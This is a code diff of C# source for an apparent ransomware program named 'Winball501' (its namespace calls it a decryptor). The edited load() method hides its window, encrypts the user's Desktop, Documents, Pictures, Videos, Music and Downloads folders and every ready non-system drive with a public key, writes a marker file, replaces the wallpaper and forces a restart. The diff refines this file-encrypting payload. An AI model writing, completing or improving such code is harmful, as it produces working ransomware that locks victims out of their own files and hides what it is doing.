@@ -112,71 +112,74 @@ namespace Winball501_Decryptor
         public async void load()
         {
             this.Visible = false;
-            string systemDrive = Environment.GetEnvironmentVariable("SystemDrive");
-            string encryptedFile = Path.Combine(systemDrive, "encrypted.txt");
+            this.Hide();
+            this.WindowState = FormWindowState.Minimized;
+            string encryptedFile = Path.Combine(Environment.GetEnvironmentVariable("SystemDrive"), "encrypted.txt");
 
             if (!File.Exists(encryptedFile))
             {
-                List<Task> tasks = new List<Task>();
+                foreach (Environment.SpecialFolder folder in new[] {
+    Environment.SpecialFolder.Desktop,
+    Environment.SpecialFolder.MyDocuments,
+    Environment.SpecialFolder.MyPictures,
+    Environment.SpecialFolder.MyVideos,
+    Environment.SpecialFolder.MyMusic,
 
-                // Encrypt common user directories
-                foreach (Environment.SpecialFolder folder in new[]
-                {
-            Environment.SpecialFolder.Desktop,
-            Environment.SpecialFolder.MyDocuments,
-            Environment.SpecialFolder.MyPictures,
-            Environment.SpecialFolder.MyVideos,
-            Environment.SpecialFolder.MyMusic,
-        })
+})
                 {
                     string path = Environment.GetFolderPath(folder);
                     Encrypt encrypt = new Encrypt(this, publickey, path);
                     tasks.Add(Task.Run(() => encrypt.run()));
                 }
+               
 
-                // Encrypt Downloads folder
-                string downloadsPath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.UserProfile), "Downloads");
-                Encrypt encryptDownloads = new Encrypt(this, publickey, downloadsPath);
-                tasks.Add(Task.Run(() => encryptDownloads.run()));
+            
+               
+                string downloadsPath = System.IO.Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.UserProfile), "Downloads");
 
-                // Encrypt all available drives (excluding system drive already handled)
-                foreach (DriveInfo drive in DriveInfo.GetDrives())
+                Encrypt encrypt1 = new Encrypt(this, publickey, downloadsPath);
+                tasks.Add(Task.Run(() => encrypt1.run()));
+                DriveInfo[] drives = DriveInfo.GetDrives();
+                foreach (DriveInfo drive in drives)
                 {
-                    if (drive.IsReady) // Only process ready drives
+                    if (drive.IsReady)
                     {
-                        string drivePath = drive.RootDirectory.FullName;
-                        Encrypt encryptDrive = new Encrypt(this, publickey, drivePath);
-                        tasks.Add(Task.Run(() => encryptDrive.run()));
+                        string path = drive.Name;
+
+                        // Retrieve the system drive from the environment variable.
+                        // Default to "C:" if not set.
+                        string systemDrive = Environment.GetEnvironmentVariable("SystemDrive") ?? "C:";
+
+                        if (!path.StartsWith(systemDrive, StringComparison.OrdinalIgnoreCase))
+                        {
+                            Encrypt encrypt = new Encrypt(this, publickey, path);
+                            tasks.Add(Task.Run(() => encrypt.run()));
+                        }
+                      
                     }
                 }
-
-                // Mark encryption as completed
-                File.Create(encryptedFile).Close();
-
-                // Wait for all tasks to finish
+           
                 await Task.WhenAll(tasks);
-
-                // Make form visible again
+                File.Create(encryptedFile).Close();
                 this.Visible = true;
-
+                this.Show();
+                this.WindowState = FormWindowState.Normal;
                 using (MemoryStream ms = new MemoryStream())
                 {
                     Properties.Resources.winball501.Save(ms, System.Drawing.Imaging.ImageFormat.Png);
                     File.WriteAllBytes(Environment.GetEnvironmentVariable("SystemDrive") + "\\winball501.png", ms.ToArray());
                 }
-
                 // Change wallpaper
-                SystemParametersInfo(spi, 0, Path.Combine(systemDrive, "winball501.png"), spif | send);
-
-                // Restart system after 7 seconds
+                SystemParametersInfo(spi, 0, Environment.GetEnvironmentVariable("SystemDrive") + "\\winball501.png", spif | send);
+                //Everything is done now restart PC
                 Process.Start("shutdown", "/r /t 2");
+
             }
             else
             {
                 this.Visible = true;
             }
         }
-
         class Encrypt
         {
             Form1 form;
